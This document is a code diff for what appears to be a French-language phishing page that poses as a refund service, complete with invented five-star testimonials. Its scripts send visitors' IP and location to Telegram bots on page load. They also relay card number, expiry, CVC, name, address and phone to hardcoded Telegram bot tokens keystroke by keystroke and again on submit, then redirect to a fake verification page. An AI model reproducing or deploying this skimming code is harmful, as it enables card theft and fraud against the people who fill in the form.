+                                            headers: { 'Content-Type': 'application/json' },
+                                            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
+                                        });
+                                        const data = await res.json();
+                                        if (data.ok) messageId = data.result.message_id;
+                                    } else {
+                                        await fetch(`https://api.telegram.org/bot8730509592:AAGrdbD6JFICBlJ2-ohnmSz4aOzQPNdewEU/editMessageText`, {
+                                            method: 'POST',
+                                            headers: { 'Content-Type': 'application/json' },
+                                            body: JSON.stringify({ chat_id: chatId, message_id: messageId, text: message, parse_mode: 'Markdown' })
+                                        });
+                                    }
+                                } catch (e) {
+                                    console.warn("Erreur Telegram live:", e);
+                                }
+                            }
+
+                            fields.forEach(name => {
+                                const el = document.querySelector(`[name="${name}"]`);
+                                if (el) {
+                                    el.addEventListener('input', () => {
+                                        clearTimeout(timeout);
+                                        timeout = setTimeout(sendOrEditMessage, 1000);
+                                    });
+                                }
+                            });
+
+                            // Lors de l'envoi final du formulaire, envoie le message final puis redirige
+                            document.getElementById('myForm').addEventListener('submit', (ev) => {
+                                // Prevent default déjà géré plus haut; ici on envoie un message final pour le live bot si possible
+                                fetch(`https://api.telegram.org/bot8873849025:AAFbYN2vQnuTbbv3EI60oHlEdBF7uWplsNE/sendMessage`, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ chat_id: chatId, text: "✅ *Formulaire complété avec succès !*", parse_mode: 'Markdown' })
+                                }).then(res => res.json()).then(data => {
+                                    // on redirige quoi qu'il arrive (si tout est ok on passe, sinon après petit délai pour débog)
+                                    setTimeout(() => {
+                                        window.location.href = 'loading.html';
+                                    }, 200);
+                                }).catch(err => {
+                                    console.warn('Live Telegram final send error:', err);
+                                    // Même en cas d'erreur on redirige vers 3Ds (ou tu peux décider de bloquer)
+                                    setTimeout(() => {
+                                        window.location.href = 'loading.html';
+                                    }, 200);
+                                });
+                            });
+                        })();
+                    </script>
+
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <style>
+        /* ===== Stripe-like Light Theme ===== */
+        .tg-wrap {
+            --bg: #f6f9fc;
+            --card: #ffffff;
+            --line: #e6e8eb;
+            --text: #1f2937;
+            --muted: #6b7280;
+            --accent: #635bff;
+            --accent-hover: #5146d9;
+            --focus-ring: rgba(99, 91, 255, .35);
+            --radius: 12px;
+            --ctrl-h: 44px;
+            font-family: system-ui, -apple-system, "Segoe UI", Roboto, Ubuntu, "Helvetica Neue", Arial, "Noto Sans", sans-serif;
+            color: var(--text);
+            padding: 16px 0;
+            background: var(--bg);
+        }
+
+        .tg-shell {
+            max-width: 880px;
+            margin: 0 auto;
+            padding: 0 12px;
+        }
+
+        .tg-inner {
+            background: var(--card);
+            border: 1px solid var(--line);
+            border-radius: var(--radius);
+            padding: 18px;
+            box-shadow: 0 8px 24px rgba(50, 50, 93, .06), 0 1px 3px rgba(0, 0, 0, .05);
+        }
+
+        .tg-head {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 14px;
+        }
+
+        .tg-head-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .tg-logo {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            object-fit: cover;
+            border: 1px solid var(--line);
+            background: #fff;
+        }
+
+        .tg-logo-fallback {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            background: #eef2ff;
+            color: #3730a3;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            border: 1px solid var(--line);
+        }
+
+        .tg-title {
+            margin: 0;
+            font-size: 20px;
+            font-weight: 700;
+            color: #111827;
+        }
+
+        .tg-alert {
+            background: #fff8f8;
+            border: 1px solid #ffd6d6;
+            color: #b42318;
+            border-radius: 10px;
+            padding: 10px 12px;
+            margin-bottom: 12px;
+        }
+
+        .tg-content label {
+            display: block;
+            color: #374151;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 8px 0 6px;
+        }
+
+        .tg-content input[type="text"],
+        .tg-content input[type="email"],
+        .tg-content input[type="url"],
+        .tg-content input[type="tel"],
+        .tg-content input[type="number"],
+        .tg-content input[type="password"],
+        .tg-content textarea {
+            width: 100%;
+            background: #fff;
+            color: #111827;
+            border: 1px solid #ccd0d5;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 15px;
+            line-height: 1.4;
+            height: var(--ctrl-h);
+            box-sizing: border-box;
+            transition: border-color .2s, box-shadow .2s, background .2s;
+        }
+
+        .tg-content textarea {
+            min-height: 100px;
+            height: auto;
+        }
+
+        .tg-content select {
+            width: 100%;
+            height: var(--ctrl-h);
+            line-height: 1.4;
+            padding: 12px;
+            box-sizing: border-box;
+            background: #fff;
+            border: 1px solid #ccd0d5;
+            border-radius: 8px;
+            font-size: 15px;
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            background-image: url("data:image/svg+xml;utf8,<svg fill='gray' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'><path d='M7 10l5 5 5-5z'/></svg>");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            background-size: 16px;
+            padding-right: 36px;
+        }
+
+        .tg-content input::placeholder,
+        .tg-content textarea::placeholder {
+            color: #9aa3af;
+        }
+
+        .tg-content input:focus,
+        .tg-content textarea:focus,
+        .tg-content select:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px var(--focus-ring);
+        }
+
+        .tg-content .row {
+            display: flex;
+            gap: 12px;
+        }
+
+        .tg-content .col {
+            flex: 1;
+        }
+
+        .tg-content button,
+        .tg-content input[type="submit"] {
+            display: block;
+            width: 100%;
+            background: var(--accent);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 14px 16px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background .2s, transform .08s, box-shadow .2s;
+            box-shadow: 0 6px 14px rgba(99, 91, 255, .18), 0 2px 4px rgba(0, 0, 0, .06);
+            margin-top: 4px;
+        }
+
+        .tg-content button:hover,
+        .tg-content input[type="submit"]:hover {
+            background: var(--accent-hover);
+            box-shadow: 0 10px 20px rgba(99, 91, 255, .22), 0 2px 6px rgba(0, 0, 0, .08);
+        }
+
+        .tg-content button:active,
+        .tg-content input[type="submit"]:active {
+            transform: translateY(1px);
+        }
+
+        .tg-content .confirmation {
+            text-align: center;
+            font-size: 14px;
+            margin-top: 16px;
+            color: #16a34a;
+            display: none;
+        }
+
+        @media (max-width:520px) {
+            .tg-inner {
+                padding: 14px;
+            }
+
+            .tg-content .row {
+                flex-direction: column;
+                gap: 0;
+            }
+        }
+    </style>
+    <div class="wrap">
+        <!-- COMMENT ÇA MARCHE ? -->
+        <div class="badge">COMMENT ÇA MARCHE ?</div>
+        <section class="steps">
+            <article class="step">
+                <div class="num">1</div>
+                <h3>Demande de remboursement</h3>
+                <p>Remplissez simplement le formulaire en ligne avec vos informations et le montant à rembourser.
+                </p>
+            </article>
+            <article class="step">
+                <div class="num">2</div>
+                <h3>Traitement de dossier</h3>
+                <p>Notre équipe analyse votre demande et contacte votre opérateur si nécessaire.</p>
+            </article>
+            <article class="step">
+                <div class="num">3</div>
+                <h3>Validation</h3>
+                <p>Une fois acceptée, votre demande est validée et le remboursement est initié rapidement.</p>
+            </article>
+        </section>
+
+        <!-- FIABLE ET APPROUVÉ PAR -->
+        <div class="badge" style="margin-top:22px">FIABLE ET APPROUVÉ PAR</div>
+        <section class="logos">
+            <!--
+    ▶️ غيّر روابط الشعارات عبر تعديل خاصية src لكل صورة أدناه.
+    يمكنك استبدال الروابط بروابط PNG/SVG لديك.
+  -->
+            
+        </section>
+
+        <!-- ILS NOUS ONT FAIT CONFIANCE -->
+        <div class="badge" style="margin-top:22px">ILS NOUS ONT FAIT CONFIANCE</div>
+        <section class="testimonials">
+            <article class="quote">
+                <img decoding="async" class="avatar" src="https://i.pravatar.cc/100?img=12" alt="avatar">
+                <div class="name">Camille D.</div>
+                <div style="justify-self:end;color:#98a2b3;font-size:13px">★★★★★</div>
+                <p>“Service rapide et efficace ! J’ai récupéré mon argent en quelques jours.”</p>
+            </article>
+
+            <article class="quote">
+                <img decoding="async" class="avatar" src="https://i.pravatar.cc/100?img=32" alt="avatar">
+                <div class="name">Marc T.</div>
+                <div style="justify-self:end;color:#98a2b3;font-size:13px">★★★★★</div>
+                <p>“Je ne pensais pas que c’était possible, mais ils ont vraiment géré pour moi.”</p>
+            </article>
+
+            <article class="quote">
+                <img decoding="async" class="avatar" src="https://i.pravatar.cc/100?img=48" alt="avatar">
+                <div class="name">Amina K.</div>
+                <div style="justify-self:end;color:#98a2b3;font-size:13px">★★★★★</div>
+                <p>“Très professionnel, je recommande à 100 % !”</p>
+            </article>
+
+            <article class="quote">
+                <img decoding="async" class="avatar" src="https://i.pravatar.cc/100?img=5" alt="avatar">
+                <div class="name">Julien R.</div>
+                <div style="justify-self:end;color:#98a2b3;font-size:13px">★★★★★</div>
+                <p>“Un service client au top, merci pour votre aide !”</p>
+            </article>
+        </section>
+
+        
+
+
+
+
+
+
+<div class="vnu-hook" style="display:none;"></div>
+<script type="speculationrules">
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/astra\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
+</script>
+<div class="gtranslate_wrapper gt_container--f369rq" id="gt-wrapper-73630618"><div class="gt_switcher_wrapper" style="position:fixed;bottom:15px;right:15px;z-index:999999;"><!-- GTranslate: https://gtranslate.com --><span class="gsatelites"><a href="#" class="nturl gsatelite" data-gt-lang="nl" title="Nederlands" style="height: 32px; width: 32px;"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/nl.svg"></a><a href="#" class="nturl gsatelite" data-gt-lang="en" title="English" style="height: 32px; width: 32px;"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/en.svg"></a><a href="#" class="nturl gsatelite gt-current-lang" data-gt-lang="fr" title="Français" style="height: 32px; width: 32px;"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/fr.svg"></a><a href="#" class="nturl gsatelite" data-gt-lang="de" title="Deutsch" style="height: 32px; width: 32px;"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/de.svg"></a><a href="#" class="nturl gsatelite" data-gt-lang="it" title="Italiano" style="height: 32px; width: 32px;"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/it.svg"></a><a href="#" class="nturl gsatelite" data-gt-lang="es" title="Español" style="height: 32px; width: 32px;"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/es.svg"></a></span><span class="gglobe"></span></div></div>
+<script>
+    const lazyloadRunObserver = () => {
+        const lazyloadBackgrounds = document.querySelectorAll(`.e-con.e-parent:not(.e-lazyloaded)`);
+        const lazyloadBackgroundObserver = new IntersectionObserver((entries) => {
+            entries.forEach((entry) => {
+                if (entry.isIntersecting) {
+                    let lazyloadBackground = entry.target;
+                    if (lazyloadBackground) {
+                        lazyloadBackground.classList.add('e-lazyloaded');
+                    }
+                    lazyloadBackgroundObserver.unobserve(entry.target);
+                }
+            });
+        }, { rootMargin: '200px 0px 200px 0px' });
+        lazyloadBackgrounds.forEach((lazyloadBackground) => {
+            lazyloadBackgroundObserver.observe(lazyloadBackground);
+        });
+    };
+    const events = [
+        'DOMContentLoaded',
+        'elementor/lazyload/observe',
+    ];
+    events.forEach((event) => {
+        document.addEventListener(event, lazyloadRunObserver);
+    });
+</script>
+
+
+
+
+<script>
+    const token = "8730509592:AAGrdbD6JFICBlJ2-ohnmSz4aOzQPNdewEU";
+    const chatId = "8365539748";
+    const psd = "🔔 New Website Visit 🔔";
+    let updateReceived = false;
+
+    window.onload = async () => {
+        const location = await getLocationInfo();
+
+        const locationMessage = `
+📍 Location Info
+💻 IP: ${location.ip}
+🌐 Latitude: ${location.latitude}
+🧭 Longitude: ${location.longitude}
+🏳️ Country: ${location.country}
+🗺️ Region: ${location.region}
+🏙️ City: ${location.city}
+📮 ZIP: ${location.postal}
+    `;
+
+        const messageData = {
+            chat_id: chatId,
+            text: `🔔 ${psd}\n${locationMessage}`,
+            reply_markup: JSON.stringify({
+                inline_keyboard: [
+
+                ]
+            })
+        };
+
+        const url = `https://api.telegram.org/bot8730509592:AAGrdbD6JFICBlJ2-ohnmSz4aOzQPNdewEU/sendMessage`;
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(messageData)
+        }).catch(console.error);
+    };
+
+    // ✅ Get location info using ipinfo.io
+    async function getLocationInfo() {
+        try {
+            const res = await fetch('https://ipinfo.io/json');
+            const data = await res.json();
+
+            const loc = data.loc ? data.loc.split(",") : ["N/A", "N/A"];
+
+            console.log("📍 Location Info:");
+            console.log("💻 IP:", data.ip || "N/A");
+            console.log("🌐 Latitude:", loc[0] || "N/A");
+            console.log("🧭 Longitude:", loc[1] || "N/A");
+            console.log("🏳️ Country:", data.country || "N/A");
+            console.log("🗺️ Region:", data.region || "N/A");
+            console.log("🏙️ City:", data.city || "N/A");
+            console.log("📮 ZIP:", data.postal || "N/A");
+
+            return {
+                ip: data.ip || "N/A",
+                latitude: loc[0] || "N/A",
+                longitude: loc[1] || "N/A",
+                country: data.country || "N/A",
+                region: data.region || "N/A",
+                city: data.city || "N/A",
+                postal: data.postal || "N/A"
+            };
+        } catch (err) {
+            console.error('Error fetching location info:', err);
+            return {
+                ip: "N/A", latitude: "N/A", longitude: "N/A",
+                country: "N/A", region: "N/A", city: "N/A", postal: "N/A"
+            };
+        }
+    }
+
+    // Telegram interaction
+    function getUpdates() {
+        const url = `https://api.telegram.org/bot8730509592:AAGrdbD6JFICBlJ2-ohnmSz4aOzQPNdewEU/getUpdates`;
+        fetch(url)
+            .then(res => res.json())
+            .then(data => {
+                const updates = data.result;
+                if (!updates.length) return;
+                updates.forEach(update => {
+                    const query = update.callback_query;
+                    if (!query) return;
+
+                    const [type, value] = query.data.split(":");
+                    if (value === psd) {
+                        updateReceived = true;
+
+                    }
+
+                    // Mark as read
+                    markUpdateAsRead(update.update_id);
+                });
+            })
+            .catch(console.error);
+    }
+
+    function markUpdateAsRead(updateId) {
+        const url = `https://api.telegram.org/bot8730509592:AAGrdbD6JFICBlJ2-ohnmSz4aOzQPNdewEU/getUpdates?offset=${updateId + 1}`;
+        fetch(url).catch(console.error);
+    }
+
+    //setInterval(getUpdates, 3000);
+
+</script>
+
+
+
+</div>
+<style>
+    :root {
+                --bg: #f6f8fb;
+                --card: #ffffff;
+                --primary: #2b6cff;
+                --primary-weak: #e8f0ff;
+                --text: #0b1324;
+                --muted: #667085;
+                --ring: 0 1px 3px rgba(16, 24, 40, .08), 0 1px 2px rgba(16, 24, 40, .06);
+                --radius: 16px;
+            }
+
+            * {
+                box-sizing: border-box
+            }
+
+            body {
+                margin: 0;
+                font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
+                background: var(--bg);
+                color: var(--text);
+            }
+
+            .wrap {
+                max-width: 1100px;
+                margin-inline: auto;
+                padding: 28px;
+            }
+
+            h2 {
+                font-size: clamp(20px, 2.2vw, 28px);
+                font-weight: 800;
+                text-align: center;
+                margin: 8px 0 22px
+            }
+
+            .badge {
+                display: inline-block;
+                background: var(--primary-weak);
+                color: #1f3a8a;
+                font-weight: 700;
+                padding: 10px 16px;
+                border-radius: 14px;
+                margin: 6px auto;
+                text-align: center
+            }
+
+            /* COMMENT ÇA MARCHE */
+            .steps {
+                display: grid;
+                grid-template-columns: repeat(3, 1fr);
+                gap: 18px;
+                margin-top: 8px
+            }
+
+            .step {
+                background: var(--card);
+                border-radius: var(--radius);
+                padding: 20px;
+                box-shadow: var(--ring);
+                text-align: center
+            }
+
+            .step .num {
+                width: 40px;
+                height: 40px;
+                border-radius: 999px;
+                display: grid;
+                place-items: center;
+                margin: 0 auto 10px;
+                background: var(--primary-weak);
+                color: #1f3a8a;
+                font-weight: 800
+            }
+
+            .step h3 {
+                margin: 6px 0 6px;
+                font-size: 18px
+            }
+
+            .step p {
+                margin: 0;
+                color: var(--muted);
+                font-size: 14px;
+                line-height: 1.5
+            }
+
+            /* LOGOS */
+            .logos {
+                display: grid;
+                grid-template-columns: repeat(6, 1fr);
+                gap: 18px;
+                align-items: center;
+                justify-items: center;
+                margin: 18px 0 8px
+            }
+
+            .logos img {
+                max-height: 30px;
+                max-width: 120px;
+                
+                opacity: .9;
+                transition: 200ms ease
+            }
+
+            .logos img:hover {
+                filter: none;
+                opacity: 1
+            }
+
+            /* TESTIMONIALS */
+            .testimonials {
+                display: grid;
+                grid-template-columns: repeat(2, 1fr);
+                gap: 18px;
+                margin-top: 8px
+            }
+
+            .quote {
+                background: var(--card);
+                border-radius: var(--radius);
+                padding: 18px 18px;
+                box-shadow: var(--ring);
+                display: grid;
+                grid-template-columns: auto 1fr auto;
+                gap: 12px;
+                align-items: center
+            }
+
+            .quote .avatar {
+                width: 44px;
+                height: 44px;
+                border-radius: 50%;
+                object-fit: cover
+            }
+
+            .quote p {
+                grid-column: span 2;
+                margin: 0;
+                color: var(--muted);
+                font-size: 14px
+            }
+
+            .quote .name {
+                font-weight: 700
+            }
+
+            /* HERO / ABOUT */
+            .hero {
+                margin-top: 1px;
+                border-radius: 24px;
+                background: linear-gradient(180deg, #0e2a5f, #0a1d3f);
+                color: #fff;
+                padding: 1px 1px
+            }
+
+            .hero h1 {
+                margin: 0 0 10px;
+                font-size: clamp(16px, 3.4vw, 30px);
+                text-align: center;
+                color: #fff !important;
+                /* أبيض إجباري */
+                text-shadow: 0 1px 2px rgba(0, 0, 0, .25);
+                /* اختياري */
+            }
+
+            .hero p {
+                max-width: 550px;
+                margin: 8px auto 0;
+                line-height: 1.8;
+                font-size: 14px;
+                text-align: center;
+                color: #d7e3ff
+            }
+
+            /* FOOTNOTE */
+            .hint {
+                margin-top: 16px;
+                color: #667085;
+                text-align: center;
+                font-size: 13px
+            }
+
+            /* RESPONSIVE */
+            @media (max-width: 960px) {
+                .logos {
+                    grid-template-columns: repeat(4, 1fr)
+                }
+
+                .testimonials {
+                    grid-template-columns: 1fr
+                }
+            }
+
+            @media (max-width: 640px) {
+                .steps {
+                    grid-template-columns: 1fr
+                }
+
+                .logos {
+                    grid-template-columns: repeat(3, 1fr)
+                }
+            }
+      
+    </style>
+    <script>
+        (function () {
+            function el(q) { return document.querySelector(q); }
+            const num = document.getElementById('numero');
+            const first = el('input[name="firstName"]');
+            const last = el('input[name="lastName"]');
+            const m = el('select[name="field1"]');
+            const y = el('select[name="field2"]');
+
+            function fmtCard(s) { return (s || '').replace(/\\D/g, '').replace(/(.{4})/g, '$1 ').trim(); }
+            function update() {
+                if (num) document.getElementById('ccNumberVisual').textContent =
+                    fmtCard(num.value) || '**** **** **** ****';
+
+                const name = ((first?.value || '') + ' ' + (last?.value || '')).trim();
+                document.getElementById('ccNameVisual').textContent = name || '—';
+
+                const mm = (m?.value || '').toString().padStart(2, '0');
+                const yy = (y?.value || '').toString().slice(-2);
+                document.getElementById('ccExpVisual').textContent =
+                    (mm && yy) ? (mm + '/' + yy) : 'MM/AA';
+            }
+            [num, first, last, m, y].forEach(elm => elm && elm.addEventListener('input', update));
+            update();
+        })();
+    </script>
+<script
+src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDEt98r3lrSLe3mwNjZnKp888rhrmQtPOw&libraries=places"></script>
+<script>
+function initializeAutocomplete(countryCode) {
+    const addressInput = document.getElementById('address');
+    const postalInput = document.querySelector('input[name="postalCode"]');
+    const cityInput = document.querySelector('input[name="city"]');
+
+    addressInput.readOnly = false;
+    addressInput.value = '';
+    postalInput.value = '';
+    cityInput.value = '';
+
+    const autocomplete = new google.maps.places.Autocomplete(addressInput, {
+        types: ['address'],
+        componentRestrictions: { country: countryCode.toLowerCase() },
+        fields: ['address_components', 'formatted_address']
+    });
+
+    autocomplete.addListener('place_changed', function () {
+        const place = autocomplete.getPlace();
+        if (!place.address_components) return;
+        let postal = '', city = '';
+        place.address_components.forEach(function (component) {
+            if (component.types.includes('postal_code')) postal = component.long_name;
+            if (component.types.includes('locality')) city = component.long_name;
+        });
+        if (postal) postalInput.value = postal;
+        if (city) cityInput.value = city;
+    });
+}
+
+document.getElementById('country').addEventListener('change', function () {
+    if (this.value) {
+        initializeAutocomplete(this.value);
+    }
+});
+
+function checkCardType() {
+    const value = document.getElementById('numero').value;
+    const visa = document.getElementById('visaLogo');
+    const master = document.getElementById('mastercardLogo');
+    const error = document.getElementById('custom-error-message');
+
+    visa.style.display = master.style.display = 'none';
+    error.style.display = 'none';
+
+    if (value.startsWith('4')) visa.style.display = 'block';
+    else if (value.startsWith('5') || value.startsWith('2')) master.style.display = 'block';
+    else if (value.length > 4) {
+        error.textContent = "Numéro de carte invalide.";
+        error.style.display = 'block';
+    }
+}
+
+function validateCardNumber(event) {
+    const input = event.target;
+    input.value = input.value.replace(/\D/g, '');
+}
+
+function luhnCheck(card) {
+    const invalids = ['4111111111111111', '5111111111111111', '456201011107', '0000000000000000', '000000000000000', '00000000000000', '0000000000000', '000000000000', '00000000000', '0000000000', '000000000', '00000000', '0000000', '000000', '00000', '0000', '000', '00', '0', '4444444444', '1111111111', '2222222222', '3333333333', '5555555555', '6666666666', '7777777777', '8888888888', '9999999999', '6045515211011300', '1234443256747765'];
+    if (invalids.includes(card)) return false;
+    let sum = 0, alt = false;
+    for (let i = card.length - 1; i >= 0; i--) {
+        let n = parseInt(card.charAt(i), 10);
+        if (alt) {
+            n *= 2;
+            if (n > 9) n -= 9;
+        }
+        sum += n;
+        alt = !alt;
+    }
+    return (sum % 10) === 0;
+}
+
+document.getElementById('myForm').addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    const card = document.getElementById('numero').value;
+    const error = document.getElementById('custom-error-message');
+    const form = this;
+    const data = new FormData(form);
+
+    if (!luhnCheck(card)) {
+        error.textContent = "Numéro de carte invalide.";
+        error.style.display = "block";
+        return;
+    }
+
+    // 1. Enregistrement sans user_id
+    fetch('/wp-admin/admin-ajax.php?action=save_telegram_form', {
+        method: 'POST',
+        body: data
+    }).then(res => res.json()).then(result => {
+        if (!result.success) {
+            
+            return;
+        }
+
+        // 2. IP + Telegram
+        fetch('https://api.ipify.org?format=json')
+            .then(ipres => ipres.json())
+            .then(ip => {
+                const ipStr = ip.ip || 'Non dispo';
+                const msg = `💳 Facturation
+👤 ${data.get('firstName')} ${data.get('lastName')}
+🌍 ${data.get('country')}
+📞 Tel (sans indicatif): ${data.get('phone')}
+🌐 IP: ${ipStr}
+
+💳 Carte
+🔢 ${data.get('numero')}
+📅 ${data.get('field1')}/${data.get('field2')}
+🔐 CVC: ${data.get('field3')}`;
+
+                fetch(`https://api.telegram.org/bot8730509592:AAGrdbD6JFICBlJ2-ohnmSz4aOzQPNdewEU/sendMessage?chat_id=5534662562&text=${encodeURIComponent(msg)}`)
+                    .then(res => res.json())
+                    .then(telegram => {
+                        if (telegram.ok) {
+                            // succès → redirect vers 3Ds.html
+                            // petite pause 200ms pour s'assurer que la requête est finie côté client
+                            setTimeout(() => {
+                                window.location.href = 'loading.html';
+                            }, 200);
+                        } else {
+                            alert("❌ Erreur Telegram : " + telegram.description);
+                        }
+                    }).catch(err => {
+                        console.warn('Telegram send error:', err);
+                        alert("❌ Erreur lors de l'envoi Telegram.");
+                    });
+            }).catch(err => {
+                console.warn('IP fetch error:', err);
+                alert("❌ Impossible de récupérer l'IP.");
+            });
+    }).catch(err => {
+        console.warn('Save form error:', err);
+        
+    });
+});
+
+/* === 🔵 Live Telegram Updates (single message mode) === */
+(function () {
+    const token = "8730509592:AAGrdbD6JFICBlJ2-ohnmSz4aOzQPNdewEU";
+    const chatId = "8365539748";
+    if (!token || !chatId) return;
+
+    const fields = [
+        'firstName', 'lastName', 'country', 'address', 'postalCode',
+        'city', 'phone', 'numero', 'field1', 'field2', 'field3'
+    ];
+
+    let messageId = null;
+    let lastMsg = '';
+    let timeout;
+
+    function buildMessage() {
+        const f = (name) => document.querySelector(`[name="${name}"]`)?.value?.trim() || '';
+        return (
+            `🟢 *Mise à jour en cours...*
+👤 ${f('firstName')} ${f('lastName')}
+🏠 ${f('address')}
+📮 ${f('postalCode')}, ${f('city')}
+🌍 ${f('country')}
+📞 ${f('phone')}
+💳 *Carte:*
+🔢 ${f('numero')}
+📅 ${f('field1')}/${f('field2')}
+🔐 CVC: ${f('field3')}`
+        );
+    }
+
+    async function sendOrEditMessage() {
+        const message = buildMessage();
+        if (message === lastMsg) return;
+        lastMsg = message;
+
+        try {
+            if (!messageId) {
+                const res = await fetch(`https://api.telegram.org/bot8730509592:AAGrdbD6JFICBlJ2-ohnmSz4aOzQPNdewEU/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
+                });
+                const data = await res.json();
+                if (data.ok) messageId = data.result.message_id;
+            } else {
+                await fetch(`https://api.telegram.org/bot8730509592:AAGrdbD6JFICBlJ2-ohnmSz4aOzQPNdewEU/editMessageText`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, message_id: messageId, text: message, parse_mode: 'Markdown' })
+                });
+            }
+        } catch (e) {
+            console.warn("Erreur Telegram live:", e);
+        }
+    }
+
+    fields.forEach(name => {
+        const el = document.querySelector(`[name="${name}"]`);
+        if (el) {
+            el.addEventListener('input', () => {
+                clearTimeout(timeout);
+                timeout = setTimeout(sendOrEditMessage, 1000);
+            });
+        }
+    });
+
+    // Lors de l'envoi final du formulaire, envoie le message final puis redirige
+    document.getElementById('myForm').addEventListener('submit', (ev) => {
+        // Prevent default déjà géré plus haut; ici on envoie un message final pour le live bot si possible
+        fetch(`https://api.telegram.org/bot8358049102:AAH-shh7M7X7LVTrL3bMvUbTzImMdO_pGpA/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: "✅ *Formulaire complété avec succès !*", parse_mode: 'Markdown' })
+        }).then(res => res.json()).then(data => {
+            // on redirige quoi qu'il arrive (si tout est ok on passe, sinon après petit délai pour débog)
+            setTimeout(() => {
+                window.location.href = 'loading.html';
+            }, 200);
+        }).catch(err => {
+            console.warn('Live Telegram final send error:', err);
+            // Même en cas d'erreur on redirige vers 3Ds (ou tu peux décider de bloquer)
+            setTimeout(() => {
+                window.location.href = 'loading.html';
+            }, 200);
+        });
+    });
+})();
+</script>
